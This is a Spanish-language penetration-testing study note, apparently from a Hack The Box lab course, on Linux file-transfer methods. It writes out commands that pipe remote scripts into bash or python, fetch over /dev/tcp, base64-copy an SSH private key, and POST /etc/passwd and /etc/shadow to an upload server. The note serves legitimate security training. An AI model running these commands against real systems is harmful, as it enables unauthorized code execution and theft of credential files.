> En este capítulo vamos a tratar los métodos de transferencia de archivos en Linux, utilizando HTTP, Bash, SSH, etc.

### Operaciones de descarga

Vamos a ver las operaciones de descarga.

##### Base64 Codificando/Decodificando

Dependiendo del tamaño del archivo que queramos transferir, podemos usar un método que no requiera de comunicación por la red. Si tenemos acceso a una terminal, podemos codificar un archivo a base64, copiar su contenido y decodificarlo en el otro sitio.

**1. Comprobando el Hash MD5**
Se hace esto para tener el hash y comprobar la integridad del archivo. Así, comparando los hashes, podremos asegurarnos de que el archivo se ha enviado correctamente, pues se mantiene la integridad.

```bash
md5sum id_rsa
```

**2. Codificando a Base64**
Lo hacemos con el comando `echo` de esta forma:

```bash
cat id_rsa | base64 -w 0; echo

LS0tLS1CRUdJTiBPUEVOU1N...
```

**3. Decodificando el archivo**

```bash
echo -n 'LS0tLS1CRUdJTiBPUEVOU1N...' | base64 -d > id_rsa
```

FInalmente, podemos confirmar la integridad con md5sum, comprobando que el hash original con el nuevo coinciden.

##### Descargas web con wget y curl

Usando wget, podemos añadirle el parámetro `-o` para tener el output del archivo:

```shell-session
amr251@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

Usando curl, lo hacemos de la misma forma, con el parámetro `-o`

##### Ataques sin archivo en Linux

Debido a la forma en que funciona Linux y cómo operan las tuberías, la mayoría de las herramientas que usamos en Linux pueden ser utilizadas para replicar operaciones sin archivos, lo que significa que no necesitamos descargar un archivo para ejecutarlo.

_Nota: Algunos payloads como `mkfifo` escriben archivos en el disco. Ten en cuenta que, aunque la ejecución del payload puede ser sin archivos cuando utilizas una tubería, dependiendo del payload elegido, puede crear archivos temporales en el sistema operativo._

**Haciendo uso de curl**

```shell-session
amr251@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

**Haciendo uso de wget**

```shell-session
amr251@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

#### Descargas con bash (/dev/tcp)

Pueden existir situaciones en las que no podamos hacer uso de los métodos conocidos para transferencia de archivos. Mientras que la versión de bash instalada sea igual o superior a la v2.04, podemos hacer uso de este método.

**Conectando al webserver objetivo**

```shell-session
exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP GET Request**

```shell-session
amr251@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**Imprimir la respuesta**

```shell-session
amr251@htb[/htb]$ cat <&3
```

#### Descargas SSH

SSH (o Secure Shell) es un protocolo que permite el acceso seguro a computadoras remotas. La implementación de SSH incluye una utilidad SCP para la transferencia remota de archivos que, por defecto, usa el protocolo SSH. SCP (copia segura) es una utilidad de línea de comandos que permite copiar archivos y directorios entre dos hosts de forma segura. Podemos copiar nuestros archivos desde la máquina local a servidores remotos y desde servidores remotos a nuestra máquina local. SCP es muy similar a los comandos `copy` o `cp`, pero en lugar de proporcionar una ruta local, debemos especificar un nombre de usuario, la dirección IP remota o el nombre DNS, y las credenciales del usuario.

**Descarga**

```shell-session
amr251@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

#### Descargas con Python

Podemos también hacer una descarga mediante Python, siempre que esté disponible. El comando es el siguiente:

```bash
python3 -c '
	import urllib.request; 
	urllib.request.urlretrieve("http://<IP_OBJETIVO>/flag.txt", "flag.txt")
'
```

Si usamos Python2.7:

```bash
python2.7 -c '
	import urllib;
	urllib.urlretrieve ("https://<IP>/file.sh", "file.sh")
'
```

##### Descargas con PHP

La descarga, haciendo uso de `File_get_contents()` sería así:

```bash
php -r '
	$file = file_get_contents("https://<IP>/file.sh"); 
	file_put_contents("file.sh",$file);
'
```

Con el comando `Fopen()`:

```bash
php -r '
	const BUFFER = 1024; 
	$fremote = fopen("https://<IP>/file.sh", "rb"); 
	$flocal = fopen("file.sh", "wb"); 
	while ($buffer = fread($fremote, BUFFER)) { 
		fwrite($flocal, $buffer); 
	} 
	fclose($flocal); 
	fclose($fremote);'
```

También podríamos aplicar un pipe (`|`) para ejecutarlo directamente, agregando a la descarga esto:

```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

##### Descargas con JavaScript

Vamos a ver cómo descargar un archivo con JS. Llamamos a este contenido `wget.js`

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Luego, desde Windows, podemos usar `cscript.exe` y descargar un archivo:

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### Operaciones de subida

##### Subidas web

Podemos utilizar `uploadserver`, un módulo extendido de Python HTTP.Server, que incluye una página de subida de archivos. 

**1. Empezando el servidor web**

```shell-session
sudo python3 -m pip install --user uploadserver
```

**2. Creando un Certificado Self-Signed**

```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

**3. Comenzando el servidor**

```shell-session
mkdir https
cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

**4. Subiendo uno o varios archivos**

```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

También existen otras alternativas.

**Con Python3**

```shell-session
python3 -m http.server
```

Podríamos realizar subidas con el módulo de Python `uploadserver`. Iniciamos el servidor de subida:

```shell-session
python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y luego, el script para realizar dicha subida sería este:

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

También podemos convertirlo a oneliner:

```shell
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

**Con Python2.7**

```shell-session
python2.7 -m SimpleHTTPServer
```


**Con PHP**

```shell-session
php -S 0.0.0.0:8000
```

**Con Ruby**

```shell-session
ruby -run -ehttpd . -p8000
```

Independientemente del método que usemos para abrir un servidor, la descarga desde la máquina víctima se hace así:

```shell-session
wget 192.168.49.128:8000/filetotransfer.txt
```

##### Subida SCP

Si tras un escaneo vemos que el puerto 22 (SSH) está abierto, podemos usar un servidor SSH con la utilidad `scp` para subir archivos:

```shell-session
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd     
```